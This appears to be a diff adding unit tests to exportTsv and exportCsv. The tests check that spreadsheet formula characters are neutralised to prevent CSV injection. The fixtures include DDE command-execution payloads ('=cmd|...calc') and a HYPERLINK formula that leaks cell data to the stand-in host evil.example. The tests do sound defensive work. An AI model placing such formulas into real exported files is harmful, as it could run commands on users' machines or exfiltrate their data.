@@ -120,6 +120,18 @@ describe("exportTsv", () => {
     expect(rows[1][1]).toBe("col1\tcol2")
     expect(rows[1][2]).toBe("cible1\tcible2")
   })
+
+  it("neutralizes a leading formula character so spreadsheet apps don't execute it (CSV injection)", async () => {
+    const cell = makeCell({ original: "-2+3", translated: '=cmd|"/c calc"!A0', group: "GEN 1:1" })
+    const blob = exportTsv([cell])
+    const text = await blobText(blob)
+    const dataLine = text.split("\n")[1]
+    const fields = dataLine.split("\t")
+    expect(fields[1]).toBe("'-2+3")
+    // translated contains a quote so it's RFC-4180 quoted, but the neutralizing
+    // apostrophe must land right after the opening quote, not the raw "=".
+    expect(fields[2]).toBe('"\'=cmd|""/c calc""!A0"')
+  })
 })
 
 // ---------------------------------------------------------------------------
@@ -152,6 +164,27 @@ describe("exportCsv", () => {
     const blob = exportCsv(CELLS)
     const text = await blobText(blob)
     expect(text).toContain("\r\n")
+  })
+
+  it("neutralizes a leading formula character so spreadsheet apps don't execute it (CSV injection)", async () => {
+    const cell = makeCell({
+      original: '=HYPERLINK("http://evil.example/?leak="&A1,"click me")',
+      translated: "+cmd|'/c calc'!A0",
+      group: "@SUM(1+1)",
+    })
+    const blob = exportCsv([cell])
+    const text = await blobText(blob)
+    // Every field is prefixed with a bare apostrophe so Excel/Sheets/LibreOffice
+    // treat it as text instead of evaluating it as a formula on open.
+    expect(text).toContain("'@SUM(1+1)")
+    expect(text).toContain('\'=HYPERLINK(""http://evil.example/?leak=""&A1,""click me"")')
+    expect(text).toContain("'+cmd|'/c calc'!A0")
+    // No unescaped field starts with a raw formula-trigger character.
+    for (const line of text.split("\r\n").slice(1)) {
+      if (!line) continue
+      const firstField = line.startsWith('"') ? line.slice(1) : line
+      expect(firstField[0]).not.toMatch(/[=+\-@\t\r]/)
+    }
   })
 })
 
